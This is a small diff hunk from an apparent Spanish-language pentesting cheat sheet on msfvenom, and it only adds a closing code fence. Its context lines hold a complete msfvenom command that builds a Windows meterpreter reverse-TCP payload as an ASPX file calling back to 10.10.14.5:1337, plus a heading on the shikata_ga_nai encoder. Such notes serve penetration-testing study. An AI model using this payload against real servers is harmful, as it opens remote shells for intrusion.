@@ -5,6 +5,7 @@ MSFVENOM es una herramienta que viene integrada en metasploit framework que sirv
 ### Forma Típica
 ```python
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+```
 
 ### Encoder shikata_ga_nai sin interacciones
 ```python
